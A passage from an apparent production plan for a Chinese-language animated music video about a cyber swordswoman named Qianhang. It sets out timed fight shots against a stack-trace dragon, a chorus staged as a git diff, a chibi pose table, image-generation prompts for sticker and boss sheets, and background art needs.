| **95** · 142.965 | Soft downbeat; kick returns 143.81 | `landing` 142.965 · `face` 143.34 · `sword_finger` 143.809 | A hard landing on the tower's lower roof with an ink crater ring. Her HUD scans the beast from tail to head and locks onto the head, the top of the stack. Her smirk comes back. On 143.81 every cyan sword in the city lifts off the rooftops (the city's 千行) | Punch on the landing; close crop; crane up with the swords |
| **96** · 144.465 | Beats | `sword_finger` held | **Sword chains:** four volleys, one per beat, each stitching a line of swords through a coil into the tower. The pinned frames turn black and stop regrowing, and the dragon thrashes | Wide; cuts on beats 1 and 3 |
| **97** · 145.965 | Groove | `dash` 145.965 · `cut_down` 146.34 · `dash` 146.715 · `cut_up` 147.09 | She runs up the now pinned and still body, cutting whipping whiskers out of her way | Track |
| **98** · 147.465 | Fill 148.22–148.87 | `leap` 148.215 | She leaps from the neck; at the apex (148.68) the head turns head-on | Tilt up; hold the apex |
| **99** · 148.965 | 148.97, 149.34, 149.72, 150.09 | Shot A: none · Shot B: `thrust` 149.34 · Shot C: `thrust` sliding back | **Head-on clash.** Shot A: the frontal head charges the lens. Shot B, the reverse shot: she thrusts at the lens, the tip meets the jaws, and a cyan crack runs across the frame (hit-stop 6). Shot C: the head recoils, its glyph teeth shattered | Cuts on 148.965, 149.34 and 149.715; impact frame 149.34 |
| **100** · 150.465 | 150.47 … 151.59 | `low` 150.465 · `cut_up` 150.84 · `leap` 151.215 | **Uppercut** under the jaw. The head is thrown up and back with the neck stretched, and she leaps after it | Punch M; tilt up |
| **101** · 151.965 | Fill all bar | `charge` 151.965 | Above the head she raises the sword. On the fill's 16ths every sword leaves the coils (which stay black) and streams into her blade. The red clouds part in a ring of light around her, and below her the head roars up | Level with her; slow push; silhouette against the light ring |
| **102** · 153.465 | **Stabs**; 154.59, 154.78 | `cut_down` 153.465 · `cut_up` 153.746 · `issen` 154.028 (down the neck) · `enter` 154.215 | **Enter combo #4.** She plants the sword in the dragon's crown. The ripple rolls down the whole body, and **the stack unwinds** from the head to the tail: each line bursts into ink in sequence, spiralling down the tower. Big plumes on 154.59 and 154.78. The last frame, `at main`, bursts on 154.95 | Impact frame; pull back and down with the cascade |
| 103 · 154.965 | Bridge hit, guqin | (bridge) | Once its glyphs have burst, the head stays for a moment as the pure ink painting underneath, then bleeds into the bridge's monochrome ink wash. 剑非剑 begins (vocal from 154.56) | — |

---

## 8. Chorus slash beats (WebGL station journey)

In the choruses the chibi is a textured plane at each station inside the WebGL scene. The swords pass in front of and behind her, depth-sorted. The camera approaches within ±20° of her plane's facing, so the flat sticker never shows its edge. The same smear, arc and impact code runs here. Times are given as C1 / C2 / Final.

| Line | Station | Chibi drawings and set piece |
|---|---|---|
| 千行剑 破长夜 光速斩尽红字劫 (41.84 / 110.82 / 172.36) | 1: a wall of red text across the tunnel | `low` on 千, while the formation snaps into rank on 千 · 行 · 剑 → **破** (42.54 / 111.54 / 172.98): C1 `issen` through the wall; C2 `thrust` at the lens; Final the triple issen → 长夜: the camera rushes through the hole → 光速: swords streak past → **斩** (43.98 / 113.04 / 174.48): `cut_down`, with all the swords cutting alongside her; 红字劫 shatters into ink |
| 千行剑 落如雪 万般漏洞皆可解 (44.72 / 113.76 / 175.22) | 2: snow | `sword_finger` from 千 (44.94 / 113.94 / 175.44). On 落如雪 the formation falls like snow, tumbling slowly. On 万般漏洞 each sword pins a red hole. On 皆可解 the patches light up cyan in a chain |
| 赛博江湖 谁做主 一行代码定生灭 (47.90 / 116.82 / 178.40) | 3: the tallest pagoda tip | `enter` on 谁做主 (48.78 / 117.78 / 179.28): the ruler's stance. On 一行代码, one sword leaves the formation and draws a single line of code across the space. On 定生灭 the line runs and the red beyond it blinks out |
| 千行剑 千行剑 一剑劈开数据界 (51.04 / 120.04) | 4: the split | `charge` from 千 (51.12 / 120.06): the formation gathers into one giant sword above her over the two 千行剑. On 一剑 (52.74 / 121.68) she rises. **劈** (slam 53.32 / 122.33): `chop`. The giant sword falls with her chop, the data world splits along a vertical line and the halves part. Impact frame |

Where a line has no slash, the singing sticker from the non-fight sheet can stand in.

---

## 9. The payoff on 赛 (183.85) and the final chorus

The final chorus pushes the last red back line by line: 0.30 → 0.22 → 0.14 → 0.08, then 0 on 赛. The decode into colour on the slam at 171.48 can use an ASCII render of `charge`. The last line is played as a git diff:

| Time | Sung | Picture |
|---|---|---|
| 181.62–181.98 | 千行剑 | `charge`. The formation, now a whole sky of cyan swords, gathers |
| 182.34–182.70 | 千行剑 | The giant sword forms. A diff hunk fades in at the station: `@@ -4 +4 @@`, then **`- 一剑劈开数据界`** in red (the line the viewer expects, shown in 志莽行书 with the marker in JetBrains Mono), then an empty `+` row with a blinking cursor |
| 183.12 / 183.36 | 此 / 去 | The `+` row types 此去 in cyan. She rises (a hop, holding `charge`) |
| **183.84** (slam 183.85) | **赛** | `chop`, **the same drawing and the same hit as 劈**. The giant sword cleaves the red `-` line down the middle, and its halves fall away into ink. 赛 stamps large in the `+` row. Impact frame. A cyan wave runs outward from the cut over the whole city: the last red is gone and **R = 0**. This is the brightest frame of the film; the lift has to come from the picture, since the song has no key change |
| 184.02–184.68 | 博 · 再 · 无 · 缺 | Each character types in on its syllable. The formation scatters into a sky of cyan light |
| 184.68–184.97 | 缺 (held) | `enter` on the pagoda tip, with a calm smile. Then the outro: the camera pulls back through the screen to the real desk |

---

## 10. Pose needs

### 10.1 What the fights need from the chibi reference sheet (00)
This sheet is the owner-approval gate before any pose sheet, as on tokentoken. Besides front and back views, it must show **two three-quarter views at the same scale**:
- one facing the right edge, with the cybernetic arm as the near arm;
- one facing the left edge, with the monocle and the wide sleeve on the near side.

That gets the left side approved before any left-facing action pose is drawn. It also needs **the sword alone in chibi sticker style**, laid horizontally with the point to the right and the blade about as long as her body. That cell becomes the sword sprite, which is used planted beside `tsundere`, for any flying sword, and for the formation's instanced swords. The fallback is a cut-out of `refs/02-sword.png`.

### 10.2 Every drawing
"Right-facing" means facing the right edge, turned slightly toward us so both eyes show; the pearl-white cybernetic right arm is the near arm. "Left-facing" means the monocle and the wide sleeve are on the near side.

| id | Name | Facing · sword hand | Pose (prompt-ready) | Used at | 2nd facing? |
|---|---|---|---|---|---|
| `low` | Low ready (起手 / 居合) | Right · cybernetic right hand | Deep crouch, knees bent, leaning forward, weight on the front foot. The sword is held low beside the right hip, blade pointing back toward the left edge and slightly down. The left arm reaches forward at chest height with the hand in the sword-finger sign (index and middle fingers straight together), and the wide sleeve hangs. Eyes locked forward; set, focused face. The ponytail and ribbons fall behind | First frame; 6.278; 60.18; 64.215; 73.965; 75.09; 79.965; 133.965; 135.09; 150.465; chorus line 1 on 千 | No |
| `dash` | Dash | Right · right hand | Running flat out, body leaning forward about 45°, front knee high, back leg extended. The sword trails low behind her, blade pointing back and down. The left arm is swung back with the sleeve streaming. Ponytail, ribbon tails and the sword's tassel stream straight back. Determined face | 6.84–10.3; 65.34; bars 44–46; 78.465; 79.215; 136.965; bar 92; 145.965; 146.715 | **Yes → `dash_l`** |
| `leap` | Leap | Right · both hands | Airborne, knees tucked, back slightly arched. The sword is raised high behind her head in both hands (cybernetic hand above), blade pointing back toward the upper-left. Hair and ribbons lifted. Fierce face | 0.47–4.0 (fall); 10.31; 65.715; 70.778; 81.465–82.87 (incl. silhouette and dive); 136.31; 140.153; 148.215; 151.215 | No |
| `issen` | Dash-through finish | Right · right hand | A very low, long lunge: front knee bent far forward, back leg straight, body low. The cybernetic arm is swept across and fully extended forward at shoulder height, blade level and pointing at the right edge. The left arm is swept back with the sleeve flaring. A small confident smirk | 0.30–0.46; 11.528; 42.54 / 172.98; 64.59; 71.528; 80.34 / 80.528 / 80.715; 83.528; 154.028 | No |
| `cut_down` | Descending diagonal finish | Right · right hand | The cut has just travelled from upper-left to lower-right. The sword ends low in front of her, blade pointing to the lower-right. Her body is bent forward over the bent front knee, head following the cut. The left arm is flung back and up for balance with the sleeve flaring. The ponytail whips forward over her shoulder. Focused face | Combo cut 1 (10.965, 70.965, 82.965, 153.465); bar 41; 66.84; 67.59; 68.715; 70.215; 72.84; 73.59; 78.84; bar 92; 146.34; 斩 (43.98 / 113.04 / 174.48) | **Yes → `cut_down_l`** |
| `cut_up` | Rising diagonal finish | Right · right hand | The cut has just travelled from lower-left to upper-right. The sword ends high above the right side, arm fully extended up, blade pointing to the upper-right corner. Her body is stretched up onto the front toes with the back leg lifted behind; the left arm is low behind. Ponytail and ribbons flung upward | Combo cut 2 (11.246, 71.246, 83.246, 153.746); 6.465 (title); 60.465 (tide split); bar 41; 67.965; 69.84; 79.59; 134.34; 147.09; 150.84 | No |
| `charge` | Sky raise | Front · both hands | Standing tall on tiptoe. Both hands on the grip raised straight overhead, the blade pointing straight up and centred. Chin up, eyes on the blade, determined. Ponytail and ribbons lifting. The whole sword fits inside the cell | 51.12–53.30; 120.06–122.30; 151.965–153.4; 181.62–183.82 | No |
| `chop` | Overhead chop finish | Front · both hands | The instant after a vertical downward chop: knees deeply bent, body pitched forward, both hands on the grip low in front of her waist, the blade vertical and pointing straight down between her feet. She is shouting, with fierce eyes. Ponytail and ribbons flung up above her | 53.32 (劈); 122.33 (劈); **183.85 (赛)** | No |
| `enter` | Sword planted (the Enter) | Front · both hands | Standing upright, feet apart. The sword is planted deep in the ground in front of her, so the ⏎-shaped crossguard sits at her waist, clearly visible. Both hands are stacked on the pommel at chest height. Chin up, eyes half closed, calm confident smile | 11.715; 71.715; 83.715; 154.215; 谁做主 (48.78 / 117.78 / 179.28); 184.68 | No |
| `sword_finger` | Sword-finger command (御剑) | Front · right hand | The left hand is raised in front of her face in the sword-finger sign pointing up, the wide sleeve hanging from the raised arm. The sword is held point-down at her right side. Sharp eyes looking past her fingers; the ponytail drifts | 落如雪 (44.94 / 113.94 / 175.44); 75.465–78.28; 143.809–145.6 | No |
| `landing` | Three-point landing | Three-quarter toward us · right hand | Crouched low: one knee down, the other foot planted, the left hand flat on the ground. The sword is swept out low behind her to one side. Head up, fierce glare at us. Ponytail and ribbons settling | 4.03; 142.965 | No |
| `thrust` | Thrust at the viewer | Front · right hand | A lunge straight at us. The sword is thrust toward us and strongly foreshortened, so the tip and the ⏎ crossguard are nearest and largest. Her fierce face shows above the arm; the left arm is pulled back with the sleeve flaring. This echoes the cover pose | 149.34; 破 in Chorus 2 (111.54) | No |
| `back` | Back view, standing | Back · right hand | From behind, feet apart, facing into the picture. The sword hangs low in the cybernetic hand on the right side of the image, blade pointing down and out. The red bow, ponytail and ribbon tails blow to the left. Her head is turned slightly so a sliver of cheek shows | 4.97–6.28; 57.47–59.10; 72.465; 130.59; 132.465–133.96 | No |
| `smug` | 「哼」 | Three-quarter toward us · right hand | The sword rests on her right shoulder with the cybernetic hand on the grip, left hand on her hip. Head tilted, one eyebrow raised, half-lidded eyes looking down at us, smug smirk | 59.10–60.18 | No |
| `guard` | Guard skid | Right · right hand + left palm | Braced low against a blast from the right. The sword is held horizontally in front of her chest, with the left palm pressing the flat of the blade near the tip and the sleeve blown back. Feet sliding back, teeth gritted, one eye squeezed shut. Ponytail and ribbons blown to the left | 130.965–132.09 | No (the threat is always on the right) |
| `blasted` | Thrown back | Right · right hand | Airborne and thrown backward toward the left: back arched, arms flung forward, the sword still gripped, eyes squeezed shut, ponytail and ribbons streaming ahead of her | 141.465–142.9 | No |
| `spin` | Whirlwind | Front · right hand | Mid-spin: body twisted, both arms out. The sword is held out horizontally at shoulder height on the left side of the image, and the wide left sleeve flares out on the right side. One knee raised in front. The ponytail and ribbons whip around her in a horizontal arc. Sharp eyes | 74.34–75.09 | No |
| `dash_l` | Dash, facing left | **Left · LEFT hand** | The same run as `dash`, toward the left edge. The monocle and the wide sleeve are nearest us. The sword is in her **left** hand, the one in the wide sleeve, trailing low toward the right edge. The cybernetic right arm is the far arm, swung back | 138.84; 139.59 | — (is the 2nd facing) |
| `cut_down_l` | Descending cut, facing left | **Left · LEFT hand** | The cut has travelled from upper-right to lower-left. The sword, in her **left** hand, ends low in front-left, and the wide sleeve follows the cut in a big arc. Body bent forward; monocle side nearest us; the cybernetic arm flung back on the far side | 73.215; 139.028; 139.778 | — |
| `face` | Battle face close-up | Head and shoulders, three-quarter facing left (monocle eye nearest) | Sharp glare, mouth set, bangs and ponytail blown by the wind. A plain monocle (the HUD is drawn in code) | 63.465; 135.84; 143.34 | No |
| `tsundere` | 「才不是」 | Three-quarter toward us · no sword | Arms crossed, face turned away toward the left edge, cheeks flushed, pouting, eyes glancing back at us. The planted sword is the code sprite | 128.30–130.59 | No |

### 10.3 Sheets (each a separate message in one ChatGPT conversation, each with the approved 00 sheet attached)

**Shared sheet text:**
> Image N, landscape 3:2. A grid of [columns × rows] chibi stickers of Qianhang, the same design, proportions and sword as the approved chibi sheet (attached). Each cell holds one figure, centred, with the whole sword, ribbon tails and tassel inside the cell and clear magenta space around it. A thin white die-cut border around each figure. Seen at her chest height. Exactly two arms and two hands with five fingers each. Hair, ribbons, sleeve and tassel show the motion; the picture itself has no motion lines, speed lines, glows or effects, and the cyan parts are painted flat cyan. Flat pure magenta #FF00FF background everywhere. No text, letters, numbers or symbols. Do not mirror the character.

| Sheet | Layout | Cells (row-major) | Why grouped this way |
|---|---|---|---|
| **F1 "Cuts, facing right"** | 3:2 (1536×1024), 3 × 2, square cells of 512 px | `low`, `dash`, `leap` / `issen`, `cut_down`, `cut_up` | One facing and one sword hand: the core of every fight. Wide poses need square cells. Generate first and check it before the rest |
| **F2 "Facing us"** | 3:2, 4 × 2, upright cells of 384×512 | `charge`, `chop`, `enter`, `sword_finger` / `landing`, `thrust`, `back`, `smug` | Upright silhouettes; the chorus and payoff drawings |
| **F3 "Hits, turns, spin"** | 3:2, 3 × 2, square cells of 512 px | `guard`, `blasted`, `spin` / `dash_l`, `cut_down_l`, `face` | Wide poses plus the risky left-facing cells, checked together |
| Non-fight sheet | (designed with the singing, bridge and desk-pet stickers) | `tsundere` | It has no sword and belongs with the expressions |

After each sheet, check every cell against STYLE_BIBLE §3:
- the cybernetic arm, monocle and sleeve are on the correct side;
- the sword is in the stated hand and the ⏎ crossguard is visible;
- five fingers on each hand.

Fix a bad cell with ChatGPT's 标注 edit rather than regenerating the whole sheet. Cut-outs use tokentoken's route: `cutout.py --grid` on magenta, then Real-ESRGAN x4plus-anime at ×4, then measure each drawing's anchors (§2.5).

**Budget:** 3 fight sheets plus 1 boss sheet, on top of the shared 00 and the non-fight sheet(s). That is about 6–7 generations including one spare, which fits inside one day's limit of about 10.

### 10.4 Boss sheet (separate conversation, no character)
> Landscape 3:2, a 2 × 2 grid. Four studies of the same Chinese dragon, painted in monochrome Chinese ink wash with bold wet brush strokes and dry-brush texture, deep black to pale grey, only black ink on a plain flat white background, each study centred with white space around it:
> 1. the head and the start of the neck in profile facing the left edge, jaws closed, eye open, whiskers and mane flowing back, the neck ending in loose mane strands;
> 2. the same head in the same profile, jaws wide open, roaring, fangs and tongue visible;
> 3. the head facing us, charging, jaws wide open, symmetrical;
> 4. one foreclaw reaching toward the left edge, four talons spread.
>
> No text, seals, signatures or frames.

The background is white rather than magenta because this sheet is converted by its ink density, not keyed. The cells may be mirrored in code.

### 10.5 Tiers and fallbacks

| Tier | Drawings | If cut |
|---|---|---|
| 1, essential (13) | `low`, `dash`, `issen`, `cut_down`, `cut_up`, `charge`, `chop`, `enter`, `sword_finger`, `back`, `guard`, `smug`, `tsundere` | — |
| 2, big quality gain (4 + sword) | `leap`, `landing`, `spin`, `face`, the sword on 00 | `leap` → `dash` rotated upward, or `charge` for vertical rises · `landing` → `low` with a big squash and an ink ring · `spin` → `cut_up` plus the ring slash and a camera roll · `face` → an upscaled crop of `low`'s head (softer) · sword → cut out from `refs/02-sword.png` |
| 3, variety (4) | `thrust`, `blasted`, `dash_l`, `cut_down_l` | `thrust` → `issen` in a side shot, dropping the reverse shot · `blasted` → `guard` rotated −25° flying back · the left pair → the climb becomes a spiral where she always faces right while the tower scrolls under her, and `spin` handles the bar-48 tendrils |

### 10.6 Other art the fights need (backgrounds, per STYLE_BIBLE §5)
Paint the plates with blank signboards, cinnabar only in a few lanterns, and no figures; code applies the red state. These are probably shared with the storyboard's background list.

- **Opening:** the red-city panorama behind the cut (2560×1440), and a rooftop strip for the run (2048×1152) with far city, mid roofs and near ridge as separate pieces.
- **Drop 1:**
  - the firewall wall and gate seen from inside the city, with the breach, and the wall as its own layer so the tide can flow between layers (2560×1440);
  - the wall-top walkway in side view (2048×1152);
  - the plain beyond the wall to the horizon (2048×1152).
- **Drop 2:**
  - the central pagoda tower on its own, isolated so the coils can pass behind and in front of it (1152×2048);
  - the rooftops around its base (2048×1152);
  - the sky above the clouds at the tower's top (2048×1152).

---

## 11. Open points for the owner
1. **The beast:** a dragon whose body is a stack trace, the "stack overflow" that unwinds from the head down. The alternatives are a giant centipede (a literal bug, 蜈蚣精) or a 饕餮 mask (a memory leak). I recommend the dragon.
2. **Left-facing poses hold the sword in the left (sleeve) hand.** This gives the clearest silhouette and the sleeve's arc. The alternative is a right-hand backhand across the body.
3. **Sticker border:** a thin white die-cut border, as on tokentoken, for a clean key. In the fights a code rim light sits outside it so it reads as light.
4. **The title carve at 6.465** (the slash writes 「千行剑」) and the optional `DeprecationWarning` hand-off into Verse 2.
5. **Whether to generate Tier 3:** `thrust`, `blasted`, `dash_l` and `cut_down_l`.